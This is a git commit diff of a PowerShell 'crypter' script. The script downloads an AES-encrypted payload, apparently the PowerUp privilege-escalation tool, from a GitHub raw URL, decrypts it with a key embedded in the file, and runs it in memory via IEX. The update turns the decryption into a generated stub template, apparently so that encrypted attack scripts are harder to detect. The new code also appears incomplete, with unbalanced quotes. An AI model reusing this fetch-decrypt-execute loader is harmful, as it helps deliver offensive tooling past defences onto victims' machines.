976294f7d22033d5f0f8ea217d362819a8298a39
DenFox93 <volpe.daniele93@gmail.com>
2021-01-21 23:29:49 +0100

    Update (working-project)decrypterAESv2.ps1

--- (working-project)decrypterAESv2.ps1
+++ (working-project)decrypterAESv2.ps1
@@ -1,27 +1,26 @@
 #decrypt an already encrypted script(PowerUp.ps1)
-$file=(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/DenFox93/PowershellCrypter/main/examples/file1 ');
+${8}=(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/DenFox93/PowershellCrypter/main/examples/file1 ');
 
-for ($i = 1; $i -le 10; $i++) {
-    #the AES key is been saved by the encrypter in the first 44 characters of the file
-    $key=$file.substring(0,44);
+$stub_template = ''
+for ($i = 0; $i -le 10; $i++) {
+        $code_alternatives  = @()
+        $code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
+        $code_alternatives += '${3} = {1} + "`r`n"
 
-    #exlude the key from the rest of the file
-    $bytes=[System.Convert]::FromBase64String($file.substring(44));
+        $code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
+        $code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+'CBC' + "`r`n"
+        $code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+'Zeros' + "`r`n"
+        $code_alternatives += '${4}.BlockSize = 128' + "`r`n"
+        $code_alternatives += '${4}.KeySize = '+ '256' + "`n" + '${4}.Key = ${3}' + "`r`n"
+        $code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
+        $code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
+        $code_alternatives += '${4}.Dispose()' + "`r`n"
+        $code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${6}).Trim([char]0);' + "`r`n"
+        $stub_template += $code_alternatives -join ''
 
-    #decrypt
-    $aes = New-Object "System.Security.Cryptography.AesManaged";
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
-    $aes.BlockSize = 128;
-    $aes.KeySize = 256;
-    $IV = $bytes[0..15];
-    $aes.IV = $IV;
-    $aes.Key = [System.Convert]::FromBase64String($key);
-    $decryptor = $aes.CreateDecryptor();
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
-    $aes.Dispose();
-    $backToPlainText=[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0);
+        $stub_template += 'IEX' +'(${8})' + "`r`n"
+
+        $b64key=${8}.substring(0,44);
+        $b64encrypted=${8}.substring(44);
+        $code = $stub_template -f $b64encrypted, $b64key
 }
-
-#execute
-IEX($backToPlainText);
